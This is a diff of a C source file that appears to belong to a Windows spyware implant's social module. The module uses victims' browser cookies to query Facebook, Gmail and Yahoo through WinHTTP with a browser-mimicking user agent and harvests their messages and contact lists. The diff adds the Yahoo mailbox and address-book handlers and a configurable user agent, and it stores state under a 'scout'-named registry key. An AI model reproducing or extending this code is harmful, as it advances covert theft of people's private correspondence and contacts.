@@ -9,11 +9,15 @@
 
 #include "facebook.h"
 #include "gmail.h"
+#include "yahoo.h"
 #include "cookies.h"
 #include "proto.h"
 #include "crypt.h"
 #include "conf.h"
 #include "debug.h"
+
+#undef   _INCLUDE_GLOBAL_FUNCTIONS_
+#include "version.h"
 
 HINTERNET gHttpSocialSession = NULL;
 SOCIAL_ENTRY pSocialEntry[SOCIAL_ENTRY_COUNT];
@@ -108,7 +112,8 @@ VOID SocialWinHttpSetup(__in LPWSTR strDestUrl)
 	ZeroMemory(&ProxyConfig, sizeof(ProxyConfig));
 
 	// Crea una sessione per winhttp.
-	gHttpSocialSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent
+	//gHttpSocialSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent
+	gHttpSocialSession = WinHttpOpen(SOCIAL_USER_AGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent	
 
 	// Cerca nel registry le configurazioni del proxy
 	if (gHttpSocialSession && WinHttpGetIEProxyConfigForCurrentUser(&ProxyConfig)) 
@@ -179,6 +184,9 @@ DWORD HttpSocialRequest(
 	BYTE *ptr;
 	DWORD flags = 0;
 	BYTE temp_buffer[8*1024];
+
+	//make sure the buffer is initialized
+	*lpRecvBuff = NULL;
 
 	// Manda la richiesta
 	cookies_len = strlen(strCookies);
@@ -302,6 +310,11 @@ VOID InitSocialEntries()
 		wcscpy_s(pSocialEntry[n].strDomain, GMAIL_DOMAIN);
 		pSocialEntry[n].fpRequestHandler = GMailMessageHandler;
 		n++;
+
+		//yahoo mailbox
+		wcscpy_s(pSocialEntry[n].strDomain, YAHOO_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = YahooMessageHandler;
+		n++;
 	}
 
 	if (ConfIsModuleEnabled(L"addressbook"))
@@ -315,6 +328,11 @@ VOID InitSocialEntries()
 
 		wcscpy_s(pSocialEntry[n].strDomain, GMAIL_DOMAIN);
 		pSocialEntry[n].fpRequestHandler = GMailContactHandler;
+		n++;
+
+		//yahoo social
+		wcscpy_s(pSocialEntry[n].strDomain, YAHOO_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = YahooContactHandler;
 		n++;
 	}
 
@@ -403,7 +421,7 @@ VOID SocialMain()
 						else
 						{
 							pSocialEntry[i].dwIdle = SOCIAL_SHORT_IDLE;
-							pSocialEntry[i].bWaitCookie = TRUE;	
+							pSocialEntry[i].bWaitCookie = TRUE;
 						}
 					}
 					else
@@ -670,7 +688,7 @@ BOOL SocialSaveTimeStamps()
 
 	LPWSTR strUnique = GetScoutSharedMemoryName();
 	LPWSTR strSubKey = (LPWSTR) zalloc(1024*sizeof(WCHAR));
-	_snwprintf_s(strSubKey, 1024, _TRUNCATE, L"%s\\%s", strBase, strUnique);	
+	_snwprintf_s(strSubKey, 1024, _TRUNCATE, L"%s\\%s", strBase, strUnique);
 	if (!CreateRegistryKey(HKEY_CURRENT_USER, strSubKey, REG_OPTION_NON_VOLATILE, KEY_READ|KEY_WRITE, &hKey))
 	{
 		zfree(strUnique);
